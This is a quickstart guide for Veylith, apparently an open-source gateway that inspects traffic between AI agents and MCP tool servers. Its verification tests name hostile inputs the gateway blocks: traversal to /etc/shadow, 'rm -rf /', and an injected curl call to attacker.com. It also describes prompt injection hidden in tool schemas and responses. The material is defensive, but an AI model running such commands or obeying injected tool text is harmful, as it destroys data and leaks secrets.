# Veylith Developer Quickstart Guide

> **Quickstart and integration reference for deploying Veylith as an inline security boundary between AI agents and MCP servers.**

---

## 1. Overview & Threat Boundary

**Veylith** is an open-source, transparent security gateway for the [Model Context Protocol (MCP)](https://modelcontextprotocol.io). It sits inline between your AI agent client (such as Claude Desktop, Cursor, or a custom agent SDK) and upstream MCP tool servers (such as filesystem, shell, database, or API tools).

```
┌─────────────────────┐         ┌───────────────────────────────┐         ┌────────────────────────┐
│   AI Agent Client   │ ◄─────► │        Veylith Gateway        │ ◄─────► │  Upstream MCP Server   │
│ (Claude / Cursor)   │  stdio  │  - Discovery Inspection       │  stdio  │ (Filesystem, SQL, CLI) │
│                     │         │  - Argument Inspection        │         │                        │
└─────────────────────┘         │  - Response Sanitization      │         └────────────────────────┘
                                │  - Tamper-Evident Audit Log   │
                                └───────────────────────────────┘
```

### The Three Inspection Boundaries

1. **Discovery Inspection (`tools/list`)**: Sanitizes upstream tool schemas before the agent sees them, stripping prompt injection prompts, role impersonation tags, and covert instructions. Blocked tools configured via `--blocked-tools` are filtered out before reaching the agent.
2. **Argument Inspection (`tools/call` inbound)**: Intercepts dangerous parameters (recursive filesystem deletions, arbitrary shell executions, path traversals, SQL table drops) before the upstream tool executes.
3. **Response Inspection (`tools/call` outbound)**: Scans tool return values for indirect prompt injections, canary leaks, and data exfiltration payloads, applying automatic field redaction or full quarantine.

> [!IMPORTANT]
> **Defense-in-Depth Notice**  
> Veylith `0.1.0-alpha.1` is an application-layer proxy and policy enforcement point (Layer 7 for MCP). It does **not** replace operating-system sandboxing, containerization (Docker/Podman), Linux namespaces, or filesystem permission restrictions. Always run upstream MCP servers with the lowest privileges necessary.

---

## 2. Prerequisites

- **Node.js**: Version **20.0.0** or higher is required.
  ```bash
  node --version  # Must output v20.x, v22.x, or v24.x
  ```
- **Package Manager**: `npm` (bundled with Node) or `pnpm`.
- **Platform**: macOS (Apple Silicon / Intel), Linux (x86_64 / arm64), or Windows (WSL2 or PowerShell).

---

## 3. Installation & Execution

### Option A: Zero-Install via `npx` (Recommended)

Run directly from the npm registry without global installation:

```bash
# 1. Create a safe sandbox directory for your MCP filesystem server
mkdir -p "$HOME/mcp-sandbox"
echo "Secure workspace notes" > "$HOME/mcp-sandbox/notes.txt"

# 2. Run Veylith wrapping the official filesystem MCP server
npx veylith -- npx -y @modelcontextprotocol/server-filesystem "$HOME/mcp-sandbox"
```

### Option B: Global CLI Installation

```bash
npm install -g veylith

# Verify CLI is ready
veylith --help
```

### Option C: Run from Source / Local Development

If testing local features or evaluating before public npm registry sync:

```bash
# 1. Clone repository
git clone -b feat/public-productization https://github.com/NilambarSonu/Veylith.git
cd Veylith

# 2. Install dependencies & build bundles
pnpm install
pnpm build

# 3. Create sandbox directory
mkdir -p "$HOME/mcp-sandbox"
echo "Secure workspace notes" > "$HOME/mcp-sandbox/notes.txt"

# 4. Run standalone CLI wrapper directly
node packages/veylith/bin/veylith.js -- npx -y @modelcontextprotocol/server-filesystem "$HOME/mcp-sandbox"
```

---

## 4. Client Integration

### Claude Desktop

Claude Desktop connects to MCP servers via its configuration file.

- **macOS**: `~/Library/Application Support/Claude/claude_desktop_config.json`
- **Windows**: `%APPDATA%\Claude\claude_desktop_config.json`
- **Linux**: `~/.config/Claude/claude_desktop_config.json`

#### Example: Protected Filesystem Server

Replace `/Users/yourusername/mcp-sandbox` with your actual absolute path:

```json
{
  "mcpServers": {
    "filesystem-secured": {
      "command": "npx",
      "args": [
        "-y",
        "veylith",
        "--",
        "npx",
        "-y",
        "@modelcontextprotocol/server-filesystem",
        "/Users/yourusername/mcp-sandbox"
      ]
    }
  }
}
```

> [!TIP]
> If testing from local repository build before npm publication, specify the absolute path to Node and `veylith.js`:
>
> ```json
> {
>   "mcpServers": {
>     "filesystem-secured": {
>       "command": "node",
>       "args": [
>         "/path/to/Veylith/packages/veylith/bin/veylith.js",
>         "--",
>         "npx",
>         "-y",
>         "@modelcontextprotocol/server-filesystem",
>         "/Users/yourusername/mcp-sandbox"
>       ]
>     }
>   }
> }
> ```

After updating `claude_desktop_config.json`, fully quit and restart Claude Desktop. The hammer icon in Claude's prompt bar will show the connected tools mediated by Veylith.

---

### Cursor

To protect tools in Cursor, configure `.cursor/mcp.json` in your project root or user settings:

```json
{
  "mcpServers": {
    "filesystem-secured": {
      "command": "npx",
      "args": [
        "-y",
        "veylith",
        "--",
        "npx",
        "-y",
        "@modelcontextprotocol/server-filesystem",
        "/path/to/your/project"
      ]
    }
  }
}
```

---

### Custom Node.js / TypeScript Agent

If you are building custom AI agents using `@modelcontextprotocol/client`:

```typescript
import { Client } from '@modelcontextprotocol/client';
import { StdioClientTransport } from '@modelcontextprotocol/client/stdio';

const transport = new StdioClientTransport({
  command: 'npx',
  args: [
    '-y',
    'veylith',
    '--',
    'npx',
    '-y',
    '@modelcontextprotocol/server-filesystem',
    '/Users/yourusername/mcp-sandbox',
  ],
});

const client = new Client({ name: 'my-agent', version: '1.0.0' }, { capabilities: {} });
await client.connect(transport);

// Call tools normally; Veylith inspects arguments and responses transparently
const result = await client.callTool({
  name: 'read_file',
  arguments: { path: '/Users/yourusername/mcp-sandbox/notes.txt' },
});

console.log('Result:', result);
await client.close();
```

---

## 5. Verification & Security Walkthrough

You can verify Veylith's security enforcement using an MCP client or through Claude / Cursor prompts:

### Test 1: Benign Tool Call (`ALLOW`)

- **Agent Action**: Read a file inside the authorized sandbox directory (`read_file` on `notes.txt`).
- **Gateway Decision**: `ALLOW`.
- **Outcome**: The upstream tool executes normally and returns clean file content to the agent.
- **Audit Log (on `stderr`)**:
  ```json
  {
    "service": "veylith-stdio",
    "level": "info",
    "msg": "Argument security evaluation",
    "data": { "toolName": "read_file", "action": "allow", "threatCategory": "none" }
  }
  ```

### Test 2: Unauthorized Path Traversal (`BLOCK` / Containment)

- **Agent Action**: An adversary prompts the agent to read `/etc/passwd` or traverse outside the sandbox (`../../etc/shadow`).
- **Gateway Decision**: Upstream filesystem server and Veylith boundary contain the access.
- **Outcome**: Execution returns an explicit security denial with `isError: true`:
  ```json
  {
    "content": [{ "type": "text", "text": "Access denied - path outside allowed directories" }],
    "isError": true
  }
  ```

### Test 3: Dangerous Command Injection (`BLOCK`)

- **Agent Action**: An adversary prompts the agent to run `rm -rf /` or append `; curl https://attacker.com/leak` to a shell parameter.
- **Gateway Decision**: `BLOCK`.
- **Outcome**: Veylith intercepts the call **before** the upstream process executes, returning an MCP error code `-32603`:
  ```json
  {
    "error": {
      "code": -32603,
      "message": "Blocked by Veylith security policy: dangerous command execution detected"
    }
  }
  ```

### Test 4: Tool Blocklist Enforcement (`--blocked-tools`)

- **Agent Action**: Run Veylith with `--blocked-tools move_file,write_file`.
- **Gateway Decision**: Filtered at Stage 1 Discovery.
- **Outcome**: The agent never discovers `move_file` or `write_file`; they are cleanly stripped from the `tools/list` response before the client prompt sees them.

---

## 6. CLI Reference & Configuration Options

```
Usage:
  veylith [OPTIONS] [-- UPSTREAM_COMMAND [UPSTREAM_ARGS...]]
  veylith-stdio [OPTIONS] [-- UPSTREAM_COMMAND [UPSTREAM_ARGS...]]

Modes:
  1. Standalone Subprocess (Recommended for desktop)
     veylith -- <command> [args...]

  2. Gateway Bridge (Connects to running Veylith Gateway daemon)
     veylith --gateway-url http://127.0.0.1:8787/mcp

  3. Standalone HTTP (Mediates upstream MCP server over HTTP)
     veylith --upstream-url http://127.0.0.1:8788/mcp

Options:
  --gateway-url <url>      URL of Veylith Gateway (default: http://127.0.0.1:8787/mcp)
  --upstream-url <url>     URL of upstream MCP HTTP server
  --command <cmd>          Executable command for upstream MCP server
  --args <args>            Comma-separated arguments for upstream command
  --blocked-tools <list>   Comma-separated list of tool names to unconditionally block
  --log-level <level>      Log level: debug | info | warn | error (default: info)
  --fail-closed <bool>     Block requests if security evaluation fails (default: true)
  --max-buffer-size <size> Maximum stdio buffer size in bytes (default: 10485760 / 10MB)
  --meta-mode <mode>       Meta AI mode: mock | live (default: mock)
  -h, --help               Show help menu

Environment Variables:
  VEYLITH_GATEWAY_URL      Overrides default gateway URL
  UPSTREAM_MCP_URL         Overrides upstream MCP URL
  UPSTREAM_COMMAND         Upstream executable command
  BLOCKED_TOOLS            Comma-separated tool blocklist
  LOG_LEVEL                Logging verbosity
  FAIL_CLOSED              Set to 'false' to fail open (default: true)
```

---

## 7. Performance & Latency Expectations

Veylith uses a multi-tier inspection pipeline designed to introduce minimal latency on tool calls:

| Inspection Tier           | Mechanism                                | Latency (p50 / p95)       | When Triggered                               |
| :------------------------ | :--------------------------------------- | :------------------------ | :------------------------------------------- |
| **Tier 1: Deterministic** | Compiled regex & AST rules               | `< 0.05 ms` / `< 0.10 ms` | Every discovery, argument, and response      |
| **Tier 2: Heuristic**     | Keyword density & entropy score          | `0.033 ms` / `0.057 ms`   | Ambiguous patterns requiring triage          |
| **Tier 3: Semantic**      | Meta Muse (`muse-spark-1.3`) / Fireworks | `~120 ms` / `~280 ms`     | Complex natural-language payloads (optional) |

---

## 8. Troubleshooting & FAQ

### 1. `npx: command not found` or Node version error

Ensure Node.js is on your PATH and is version 20 or newer:

```bash
node -v
# Output must be >= v20.0.0
```

### 2. Large File Transfer or Tool Output Truncated

If upstream tools return very large payloads (such as 15MB+ binary dumps), increase the buffer size:

```bash
npx veylith --max-buffer-size 33554432 -- npx -y @modelcontextprotocol/server-filesystem "$HOME/mcp-sandbox"
```

### 3. Viewing Debug Logs

Veylith outputs structured JSON logs to `stderr` so they do not interfere with MCP `stdout` protocol frames. To see detailed decision traces in your terminal:

```bash
npx veylith --log-level debug -- npx -y @modelcontextprotocol/server-filesystem "$HOME/mcp-sandbox"
```

### 4. What Happens if Veylith Errors?

By default, Veylith operates **fail-closed** (`--fail-closed true`). If an internal evaluation crashes or an upstream connection terminates unexpectedly, requests are blocked with an explicit error rather than allowed through uninspected.

---

## 9. Project & Release Links

- **Landing Website**: [https://veylith-jade.vercel.app](https://veylith-jade.vercel.app)
- **GitHub Repository**: [https://github.com/NilambarSonu/Veylith](https://github.com/NilambarSonu/Veylith)
- **Changelog**: [CHANGELOG.md](https://github.com/NilambarSonu/Veylith/blob/feat/public-productization/CHANGELOG.md)
- **License**: [Apache-2.0](https://github.com/NilambarSonu/Veylith/blob/feat/public-productization/LICENSE)
